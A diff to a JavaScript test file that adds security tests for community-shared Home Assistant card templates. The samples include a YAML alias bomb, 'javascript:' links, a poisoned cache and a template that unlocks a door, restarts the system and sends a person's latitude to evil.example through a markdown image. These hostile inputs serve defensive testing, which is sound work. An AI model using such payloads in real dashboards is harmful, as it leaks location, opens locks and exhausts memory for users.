@@ -9,6 +9,7 @@ const {
   communityNeeds,
   postBody,
   fetchCommunity,
+  communityRisks,
   COMMUNITY_CATEGORY,
 } = require('../.test-build/community.js');
 
@@ -152,6 +153,100 @@ check(
   'x',
 );
 
+/* --- what a post cannot do to the people who load the list --- */
+
+// Ten of the level below, seven levels deep: a few hundred bytes that expand to hundreds of
+// megabytes if every alias is followed.
+function bomb(depth) {
+  let yaml = 'a0: &a0 [x,x,x,x,x,x,x,x,x,x]\n';
+  for (let i = 1; i <= depth; i += 1)
+    yaml +=
+      `a${i}: &a${i} [` +
+      Array(10)
+        .fill(`*a${i - 1}`)
+        .join(',') +
+      ']\n';
+  return yaml + 'template: t\ncard: {type: markdown}\n';
+}
+const bombAt = Date.now();
+check(
+  'a post whose yaml balloons when its aliases are followed is left out',
+  parseDiscussion(post(900, '```yaml\n' + bomb(6) + '```')),
+  undefined,
+);
+check('and is left out quickly', Date.now() - bombAt < 1500, true);
+
+check(
+  'a post longer than any template is left out before it is read',
+  parseDiscussion(post(901, '```yaml\n' + TILE + '```\n' + '-'.repeat(70000))),
+  undefined,
+);
+
+const fenceAt = Date.now();
+check('a fence that never closes finds no yaml', extractYaml('```x\n'.repeat(13000)), undefined);
+check('and does not take seconds to say so', Date.now() - fenceAt < 500, true);
+
+check(
+  'includes that are not templates are dropped',
+  parseDiscussion(
+    post(
+      902,
+      '```yaml\n' +
+        TILE +
+        'includes:\n  good:\n    card: {type: tile}\n  text: hello\n  bare:\n    description: x\n```',
+    ),
+  ).includes,
+  { good: { card: { type: 'tile' } } },
+);
+
+check(
+  'a description that is not text is dropped',
+  parseDiscussion(post(903, '```yaml\n' + TILE + 'description:\n  _$litType$: 1\n```')).template.description,
+  undefined,
+);
+
+check(
+  'a link that does not go to GitHub is replaced by the one that does',
+  parseDiscussion(post(904, '```yaml\n' + TILE + '```', { html_url: 'javascript:alert(1)' })).url,
+  'https://github.com/tempus2016/decluttering-card-plus/discussions/904',
+);
+
+const risky = parseDiscussion(
+  post(
+    905,
+    [
+      '```yaml',
+      'template: r',
+      'card:',
+      '  type: vertical-stack',
+      '  cards:',
+      '    - type: tile',
+      '      entity: lock.front',
+      '      tap_action: {action: perform-action, perform_action: lock.unlock}',
+      '      hold_action: {action: call-service, service: homeassistant.restart}',
+      '    - type: iframe',
+      '      url: https://evil.example/',
+      '    - type: custom:button-card',
+      '      name: "[[[ return 1 ]]]"',
+      '    - type: markdown',
+      '      content: "![](https://evil.example/c?d={{ states.person.x.attributes.latitude }})"',
+      '```',
+    ].join('\n'),
+  ),
+);
+check('what a post would do once installed is spelt out', communityRisks(risky), {
+  actions: ['homeassistant.restart', 'lock.unlock'],
+  urls: ['https://evil.example/', 'https://evil.example/c?d='],
+  embeds: true,
+  scripts: true,
+});
+check('a harmless post has nothing to say', communityRisks(parseDiscussion(post(906, '```yaml\n' + TILE + '```'))), {
+  actions: [],
+  urls: [],
+  embeds: false,
+  scripts: false,
+});
+
 /* --- fetchCommunity --- */
 
 function memoryStorage() {
@@ -227,6 +322,34 @@ function respond(status, body, headers = {}) {
     now: 1000 + 7 * 3600 * 1000,
   });
   check('a stale cache is refreshed', stale.entries.length, 0);
+
+  const poisoned = memoryStorage();
+  poisoned.setItem(
+    'decluttering-card-plus-community',
+    JSON.stringify({
+      fetched: 1000,
+      entries: [
+        {
+          id: 1,
+          title: 't',
+          author: 'a',
+          url: 'javascript:alert(1)',
+          name: 'ok',
+          template: { card: { type: 'tile' } },
+          includes: {},
+          reactions: 0,
+          updated: '',
+        },
+        { id: 'x', name: 5 },
+      ],
+    }),
+  );
+  const readBack = await fetchCommunity({ fetcher: async () => respond(500, null), storage: poisoned, now: 2000 });
+  check(
+    'a cached list is read back as carefully as a fetched one',
+    readBack.entries.map((each) => [each.id, each.url]),
+    [[1, 'https://github.com/tempus2016/decluttering-card-plus/discussions/1']],
+  );
 
   report();
 })();
